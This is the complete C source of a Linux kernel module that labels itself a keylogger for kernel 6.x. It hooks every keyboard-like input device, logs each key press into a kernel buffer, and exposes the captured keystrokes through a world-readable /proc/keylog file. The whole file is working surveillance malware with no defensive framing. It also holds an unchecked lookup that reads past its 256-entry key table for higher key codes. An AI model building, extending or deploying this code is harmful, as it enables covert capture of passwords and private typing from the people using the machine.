#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>

#define BUF_CAPACITY 4096

static char *data_store;
static size_t data_length;

static struct proc_dir_entry *proc_file;

static const char *key_translation[256] = {
    [KEY_ESC] = "[ESC]",
    [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3",
    [KEY_4] = "4", [KEY_5] = "5", [KEY_6] = "6",
    [KEY_7] = "7", [KEY_8] = "8", [KEY_9] = "9",
    [KEY_0] = "0",
    [KEY_MINUS] = "-", [KEY_EQUAL] = "=",
    [KEY_BACKSPACE] = "[BKSP]",
    [KEY_TAB] = "[TAB]",
    [KEY_Q] = "q", [KEY_W] = "w", [KEY_E] = "e",
    [KEY_R] = "r", [KEY_T] = "t", [KEY_Y] = "y",
    [KEY_U] = "u", [KEY_I] = "i", [KEY_O] = "o",
    [KEY_P] = "p",
    [KEY_A] = "a", [KEY_S] = "s", [KEY_D] = "d",
    [KEY_F] = "f", [KEY_G] = "g", [KEY_H] = "h",
    [KEY_J] = "j", [KEY_K] = "k", [KEY_L] = "l",
    [KEY_Z] = "z", [KEY_X] = "x", [KEY_C] = "c",
    [KEY_V] = "v", [KEY_B] = "b", [KEY_N] = "n",
    [KEY_M] = "m",
    [KEY_SPACE] = " ",
    [KEY_ENTER] = "\n",
};

static void store_message(const char *text)
{
    size_t text_len = strlen(text);

    if (data_length + text_len >= BUF_CAPACITY) {
        memmove(data_store, data_store + text_len, BUF_CAPACITY - text_len);
        data_length = BUF_CAPACITY - text_len;
    }

    memcpy(data_store + data_length, text, text_len);
    data_length += text_len;
}

static void process_input(struct input_handle *hnd,
                          unsigned int ev_type,
                          unsigned int ev_code,
                          int ev_value)
{
    if (ev_type != EV_KEY || ev_value != 1) return;

    if (key_translation[ev_code]) {
        store_message(key_translation[ev_code]);
    } else {
        char temp[16];
        snprintf(temp, sizeof(temp), "[%u]", ev_code);
        store_message(temp);
    }
}

static bool device_filter(struct input_handler *hndlr,
                          struct input_dev *device)
{
    if (!device->name) return false;

    return strstr(device->name, "kbd") ||
           strstr(device->name, "Keyboard") ||
           strstr(device->name, "keyboard");
}

static int attach_device(struct input_handler *hndlr,
                         struct input_dev *device,
                         const struct input_device_id *id)
{
    struct input_handle *hnd;
    int status;

    hnd = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!hnd) return -ENOMEM;

    hnd->dev = device;
    hnd->handler = hndlr;
    hnd->name = "keylogger";

    status = input_register_handle(hnd);
    if (status) {
        kfree(hnd);
        return status;
    }

    status = input_open_device(hnd);
    if (status) {
        input_unregister_handle(hnd);
        kfree(hnd);
        return status;
    }

    printk(KERN_INFO "keylogger: attached to %s\n", device->name);

    return 0;
}

static void detach_device(struct input_handle *hnd)
{
    input_close_device(hnd);
    input_unregister_handle(hnd);
    kfree(hnd);
}

static const struct input_device_id device_ids[] = {
    {
        .flags = INPUT_DEVICE_ID_MATCH_EVBIT,
        .evbit = { BIT_MASK(EV_KEY) },
    },
    { }
};
MODULE_DEVICE_TABLE(input, device_ids);

static struct input_handler input_handler = {
    .event = process_input,
    .connect = attach_device,
    .disconnect = detach_device,
    .name = "keylogger",
    .id_table = device_ids,
    .match = device_filter,
};

static ssize_t read_proc(struct file *fptr, char __user *dest,
                         size_t amount, loff_t *position)
{
    return simple_read_from_buffer(dest, amount, position,
                                   data_store, data_length);
}

static const struct proc_ops proc_operations = {
    .proc_read = read_proc,
};

static int __init module_start(void)
{
    data_store = kzalloc(BUF_CAPACITY, GFP_KERNEL);
    if (!data_store) return -ENOMEM;

    proc_file = proc_create("keylog", 0444, NULL, &proc_operations);
    if (!proc_file) {
        printk(KERN_ERR "keylogger: failed to create /proc entry\n");
        kfree(data_store);
        return -ENOMEM;
    }

    if (input_register_handler(&input_handler)) {
        printk(KERN_ERR "keylogger: handler registration failed\n");
        proc_remove(proc_file);
        kfree(data_store);
        return -EINVAL;
    }

    printk(KERN_INFO "keylogger: module loaded\n");

    return 0;
}

static void __exit module_stop(void)
{
    input_unregister_handler(&input_handler);
    proc_remove(proc_file);
    kfree(data_store);

    printk(KERN_INFO "keylogger: module unloaded\n");
}

module_init(module_start);
module_exit(module_stop);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Aleksey Pardaev");
MODULE_DESCRIPTION("Linux kernel keylogger module for 6.x");